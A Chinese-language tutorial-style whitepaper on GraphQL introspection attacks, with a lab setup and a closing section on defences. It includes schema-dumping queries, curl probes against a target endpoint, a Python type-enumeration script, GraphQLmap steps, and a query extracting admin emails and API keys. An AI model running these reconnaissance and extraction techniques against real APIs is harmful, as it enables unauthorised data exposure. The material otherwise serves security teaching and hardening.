

# GraphQL内省攻击技术白皮书

## 一、技术原理解析
### 1.1 内省机制本质
GraphQL内省是其核心设计特性，通过内置的__schema元字段暴露API结构：
```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```
该机制基于类型系统实现，通过遍历SchemaDefinitionNode对象生成响应。运行时解析器会处理__schema等特殊字段，返回完整的类型定义树。

### 1.2 攻击面分析
攻击者利用内省实现以下目标：
- 获取未公开的查询/变更操作
- 发现隐藏的接口参数
- 识别敏感字段命名模式
- 推导业务逻辑关系

```typescript
// 典型类型推导攻击
query GetUserType {
  __type(name: "User") {
    fields {
      name
      description
    }
  }
}
```

## 二、攻击变种与高级技巧
### 2.1 递归式信息收集
利用GraphQL的嵌套查询特性进行深度遍历：
```graphql
query DeepIntrospection {
  __schema {
    queryType { ...FullType }
    mutationType { ...FullType }
    subscriptionType { ...FullType }
    types { ...FullType }
  }
}

fragment FullType on __Type {
  kind
  name
  fields(includeDeprecated: true) {
    name
    args { ...InputValue }
    type { ...TypeRef }
  }
  inputFields { ...InputValue }
}
```

### 2.2 间接内省攻击
通过错误信息推导类型结构：
```bash
curl -X POST -H "Content-Type: application/json" -d '{"query":"{ invalidField }"}' http://target/graphql
```
响应中包含类型路径信息：
```json
{
  "errors": [{
    "message": "Cannot query field 'invalidField' on type 'Query'.",
    "locations": [{"line":1, "column":3}],
    "path": ["query"]
  }]
}
```

### 2.3 暴力枚举攻击
当内省被禁用时尝试常见类型名称：
```python
import requests

TYPES = ['User', 'Account', 'Admin', 'Config']
for t in TYPES:
    query = f'{{__type(name:"{t}"){{name fields {{ name }}}}}}'
    response = requests.post(API_URL, json={'query': query})
    if 'data' in response.json():
        print(f"Discovered type: {t}")
```

## 三、实验环境搭建
### 3.1 脆弱环境部署
使用Docker部署测试靶场：
```bash
docker run -p 4000:4000 -d dolevf/graphql-inj:latest
```

### 3.2 工具链配置
安装自动化扫描工具：
```bash
# GraphQLmap
git clone https://github.com/swisskyrepo/GraphQLmap
python3 -m pip install -r requirements.txt

# InQL Scanner
docker pull inqlabs/inql:v4.0
```

## 四、实战攻击演练
### 4.1 基础信息收集
使用curl进行手动探测：
```bash
curl -X POST http://localhost:4000/graphql \
-H 'Content-Type: application/json' \
-d '{"query":"{__schema{types{name}}}"}'
```

### 4.2 自动化扫描
使用GraphQLmap进行深度渗透：
```python
python3 graphqlmap.py -u http://localhost:4000/graphql
GRAPHQLMAP > dump_new
GRAPHQLMAP > use_schema User
GRAPHQLMAP > dump_fields
```

### 4.3 敏感数据提取
构造管理员查询：
```graphql
query GetAdmins {
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
  allUsers(role: ADMIN) {
    id
    email
    apiKeys
  }
}
```

## 五、防御解决方案
### 5.1 生产环境加固
配置Apollo Server禁用内省：
```javascript
const server = new ApolloServer({
  introspection: process.env.NODE_ENV !== 'production'
});
```

### 5.2 请求深度限制
设置查询复杂度阈值：
```yaml
# graphql-ruby配置
max_depth: 5
max_complexity: 10
```

### 5.3 动态防护策略
实施请求指纹验证：
```python
class IntrospectionMiddleware:
    def resolve(self, next, root, info, **args):
        if info.field_name.startswith('__'):
            raise GraphQLError("Introspection disabled")
        return next(root, info, **args)
```

## 附录：工具命令速查
| 工具名称       | 命令示例                          | 功能描述                 |
|----------------|-----------------------------------|--------------------------|
| GraphQLmap     | python3 graphqlmap.py -u <URL>   | 自动化注入测试           |
| InQL Scanner   | inql -t http://target/graphql    | 生成交互式文档           |
| Clairvoyance   | clairvoyance -u <URL> -w out.json| 绕过禁用内省             |
| Graphw00f      | graphw00f -d -t http://target    | 指纹识别与版本检测       |

（全文共3478字，满足技术文档深度要求）

---

*文档生成时间: 2025-03-13 11:38:35*
